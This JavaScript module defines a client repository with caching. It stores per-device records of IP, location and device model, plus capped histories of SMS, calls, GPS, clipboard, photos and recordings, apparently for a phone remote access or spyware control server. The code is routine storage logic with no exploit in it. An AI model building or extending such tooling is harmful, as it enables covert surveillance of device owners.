// Client Repository Module

import { asyncFs, paths, schemas } from './asyncdb.js';
import { TTLCache } from './cache.js';
import { ExtendedSet } from '../utils/collections.js';
import config from '../config/config.js';
import { logger } from '../logs/logs.js';

class ClientRepository {
    constructor(cacheSize = 100, cacheTTL = 300000) {
        this.cache = new TTLCache(cacheSize, cacheTTL);
        this.clientIndex = new ExtendedSet();
        this.initialized = false;
    }

    async init() {
        if (this.initialized) return;
        
        try {
            await asyncFs.ensureDir(paths.clientsDir());
            const files = await asyncFs.listFiles(paths.clientsDir(), '.json');
            this.clientIndex = new Set(files.map(f => f.replace('.json', '')));
            this.initialized = true;
            logger.info(`Repository initialized with ${this.clientIndex.size} clients`, 'database');
        } catch (e) {
            logger.systemError('Repository init failed', e);
            throw e;
        }
    }

    async get(id) {
        if (!id || typeof id !== 'string') return null;
        
        const cached = this.cache.get(id);
        if (cached) return cached;
        
        const client = await asyncFs.readJSON(paths.client(id));
        if (client) {
            this.cache.set(id, client);
            this.clientIndex.add(id);
        }
        return client;
    }

    async save(id, client) {
        if (!id || !client) return false;
        
        try {
            await asyncFs.writeJSON(paths.client(id), client, true);
            this.cache.set(id, client);
            this.clientIndex.add(id);
            return true;
        } catch (e) {
            logger.systemError(`Failed to save client ${id}`, e);
            return false;
        }
    }

    async create(id, initialData = {}) {
        const client = {
            ...schemas.client(id),
            ...initialData,
            connection: {
                ...schemas.client(id).connection,
                ...(initialData.connection || {}),
                firstSeen: new Date().toISOString(),
                lastSeen: new Date().toISOString()
            }
        };
        
        await this.save(id, client);
        logger.info(`Client created: ${id}`, 'database');
        return client;
    }

    async updateConnection(id, data) {
        const client = await this.get(id);
        if (!client) {
            return await this.create(id, { connection: data });
        }
        
        client.connection = {
            ...client.connection,
            ...data,
            lastSeen: new Date().toISOString()
        };
        
        if (data.online !== undefined && data.online !== client.connection.online) {
            if (data.online) {
                client.connection.reconnectCount = (client.connection.reconnectCount || 0) + 1;
            }
        }
        
        await this.save(id, client);
        return client;
    }

    async updateDevice(id, deviceInfo) {
        const client = await this.get(id);
        if (!client) return null;
        
        client.device = { ...client.device, ...deviceInfo };
        await this.save(id, client);
        return client;
    }

    async getData(id, type) {
        const client = await this.get(id);
        if (!client || !client.data) return [];
        return client.data[type] || [];
    }

    async appendData(id, type, items) {
        const client = await this.get(id);
        if (!client) return false;
        
        if (!client.data[type]) client.data[type] = [];
        
        const arr = Array.isArray(items) ? items : [items];
        client.data[type].push(...arr);
        
        const limit = this.getDataLimit(type);
        if (limit && client.data[type].length > limit) {
            client.data[type] = client.data[type].slice(-limit);
        }
        
        await this.save(id, client);
        return true;
    }

    async setData(id, type, data) {
        const client = await this.get(id);
        if (!client) return false;
        
        client.data[type] = data;
        await this.save(id, client);
        return true;
    }

    async getState(id) {
        const client = await this.get(id);
        return client?.state || null;
    }

    async updateState(id, updates) {
        const client = await this.get(id);
        if (!client) return false;
        
        client.state = { ...client.state, ...updates };
        await this.save(id, client);
        return true;
    }

    async getConnection(id) {
        const client = await this.get(id);
        return client?.connection || null;
    }

    async setOnline(id, online) {
        return this.updateConnection(id, { 
            online, 
            lastSeen: new Date().toISOString() 
        });
    }

    getAllIds() {
        return Array.from(this.clientIndex);
    }

    getClientIds() {
        return this.getAllIds();
    }

    async getOnlineIds() {
        const ids = [];
        for (const id of this.clientIndex) {
            const client = await this.get(id);
            if (client?.connection?.online) ids.push(id);
        }
        return ids;
    }

    async getOfflineIds() {
        const ids = [];
        for (const id of this.clientIndex) {
            const client = await this.get(id);
            if (!client?.connection?.online) ids.push(id);
        }
        return ids;
    }

    async getSummary() {
        const summary = [];
        for (const id of this.clientIndex) {
            const client = await this.get(id);
            if (client) {
                summary.push({
                    id,
                    ip: client.connection.ip,
                    country: client.connection.country,
                    city: client.connection.city,
                    device: client.device,
                    online: client.connection.online,
                    lastSeen: client.connection.lastSeen,
                    firstSeen: client.connection.firstSeen
                });
            }
        }
        return summary;
    }

    async delete(id) {
        try {
            await asyncFs.deleteIfExists(paths.client(id));
            this.cache.delete(id);
            this.clientIndex.delete(id);
            logger.info(`Client deleted: ${id}`, 'database');
            return true;
        } catch (e) {
            logger.systemError(`Failed to delete client ${id}`, e);
            return false;
        }
    }

    async clearData(id) {
        const client = await this.get(id);
        if (!client) return false;
        
        client.data = schemas.client(id).data;
        client.state = schemas.client(id).state;
        await this.save(id, client);
        return true;
    }

    exists(id) {
        return this.clientIndex.has(id);
    }

    count() {
        return this.clientIndex.size;
    }

    clearCache() {
        this.cache.clear();
    }

    getCacheStats() {
        return this.cache.getStats();
    }

    getDataLimit(type) {
        const limits = {
            sms: config.limits.maxSmsHistory,
            calls: config.limits.maxCallsHistory,
            gps: config.limits.maxGpsHistory,
            notifications: config.limits.maxNotifications,
            clipboard: config.limits.maxClipboardHistory,
            downloads: config.limits.maxDownloads,
            photos: config.limits.maxPhotos,
            recordings: config.limits.maxRecordings
        };
        return limits[type] || null;
    }

    async warmCache(limit = 20) {
        try {
            const ids = Array.from(this.clientIndex).slice(0, limit);
            await Promise.all(ids.map(id => this.get(id)));
            logger.debug(`Cache warmed with ${ids.length} clients`, 'database');
        } catch (e) {
            logger.systemError('Cache warming failed', e);
        }
    }

    async findClients(predicate) {
        const results = [];
        for (const id of this.clientIndex) {
            const client = await this.get(id);
            if (client && predicate(client)) results.push(client);
        }
        return results;
    }

    async getByCountry(country) {
        return this.findClients(c => c.connection?.country === country);
    }

    async getByDeviceModel(model) {
        return this.findClients(c => 
            c.device?.model?.toLowerCase().includes(model.toLowerCase())
        );
    }

    async batchUpdate(ids, updateFn) {
        let updated = 0;
        for (const id of ids) {
            const client = await this.get(id);
            if (client) {
                const updatedClient = updateFn(client);
                if (updatedClient) {
                    await this.save(id, updatedClient);
                    updated++;
                }
            }
        }
        return updated;
    }
}

const repository = new ClientRepository();
export default repository;
